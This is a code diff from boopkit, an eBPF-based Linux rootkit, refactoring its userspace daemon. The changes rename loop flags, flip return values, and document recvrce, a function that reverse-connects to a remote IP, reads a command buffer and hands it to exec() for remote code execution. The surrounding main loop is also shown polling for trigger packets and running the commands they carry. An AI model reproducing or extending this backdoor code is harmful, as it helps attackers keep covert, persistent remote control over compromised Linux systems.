@@ -47,8 +47,7 @@
 #include "pr0be.skel.xdp.h"
 // clang-format on
 
-
-int boopkit_alive = 1;
+int runtime__boopkit = 1;
 
 void usage() {
   asciiheader();
@@ -69,21 +68,31 @@ void usage() {
   exit(0);
 }
 
+
+/**
+ * recvrce is a last resort attempt to reverse dial for an RCE from a
+ * boopkit-boop client.
+ *
+ * This can be opted-in by passing -r to boopkit.
+ *
+ * @param dial IP address to reverse connect
+ * @param rce
+ * @return 1 success, 0 failure
+ */
 int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
   struct sockaddr_in daddr;
   daddr.sin_family = AF_INET;
   daddr.sin_port = htons(PORT);
   if (inet_pton(AF_INET, dial, &daddr.sin_addr) != 1) {
     boopprintf(" XX Destination IP configuration failed.\n");
-    return 1;
+    return 0;
   }
 
   int revsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (revsock == -1) {
-    return 1;
+    return 0;
   }
 
-  // Set retry socket option
   struct timeval retry;
   int retval;
   retry.tv_sec = TIMEOUT_SECONDS_RECVRCE;
@@ -93,27 +102,25 @@ int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
   if (retval != 0) {
     boopprintf("Error (%d) setting socket SO_SNDTIMEO: %s\n", retval,
                strerror(errno));
-    return 1;
+    return 0;
   }
   retval = setsockopt(revsock, SOL_SOCKET, SO_RCVTIMEO,
                       (struct timeval *)&retry, sizeof(struct timeval));
   if (retval != 0) {
     boopprintf("Error (%d) setting socket SO_RCVTIMEO: %s\n", retval,
                strerror(errno));
-    return 1;
+    return 0;
   }
 
   if (connect(revsock, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
-    // boopprintf(" XX Connection SOCK_STREAM refused.\n");
-    return 1;
+    return 0;
   }
 
-  // boopprintf("***READ***\n");
   char buffer[MAX_RCE_SIZE];
   read(revsock, buffer, MAX_RCE_SIZE);
   close(revsock);
   strncpy(rce, buffer, MAX_RCE_SIZE);
-  return 0;
+  return 1;
 }
 
 struct config {
@@ -215,8 +222,8 @@ int exec(char *rce) {
   ret = strstr(rce, BOOPKIT_RCE_CMD_HALT);
   if (ret) {
     // Halt!
-    xcap_collect = 0;  // Stop the xcap loop
-    boopkit_alive = 0; // Stop the boopkit loop
+    runtime__xcap    = 0; // Stop the xcap loop
+    runtime__boopkit = 0; // Stop the boopkit loop
     boopprintf("  XX Halting boopkit: %s\n", ret);
     free(rce);
     return 0;
@@ -247,12 +254,6 @@ int main(int argc, char **argv) {
     pthread_t th;
     pthread_create(&th, NULL, xcap, (void *)cfg.dev_name);
   }
-  // ===========================================================================
-
-  // ===========================================================================
-  // [pr0be.xdp.o]
-  //
-  // [pr0be.xdp.o]
   // ===========================================================================
 
   // ===========================================================================
@@ -342,10 +343,6 @@ int main(int argc, char **argv) {
   // [pr0be.boop.o]
   // ===========================================================================
 
-  // ===========================================================================
-  // [maps]
-
-  // boop
   struct bpf_map *bpmap = bpf_object__next_map(bpobj, NULL);
   const char *bmapname = bpf_map__name(bpmap);
   boopprintf("  ->   eBPF   Map Name       : %s\n", bmapname);
@@ -359,14 +356,8 @@ int main(int argc, char **argv) {
   boopprintf(
       "================================================================\n");
 
-  // ===========================================================================
-  // Boopkit event loop
-  //
-  // Boopkit will run as a persistent daemon in userspace!
-  //
-  //
   int ignore = 0;
-  while (boopkit_alive) {
+  while (runtime__boopkit) {
     ring_buffer__poll(rb, 100);  // Ignore errors!
     // perf_buffer__poll(pb, 100); // Ignore errors!
 
@@ -413,7 +404,7 @@ int main(int argc, char **argv) {
       int xcap_found;
       // Check the packet buffer for the value to execute.
       xcap_found = xcaprce(saddrval, rce);
-      if (xcap_found == 0) {
+      if (xcap_found == 1) {
         exec(rce);
         bpf_map_delete_elem(fd, &jkey);
         ikey = jkey;
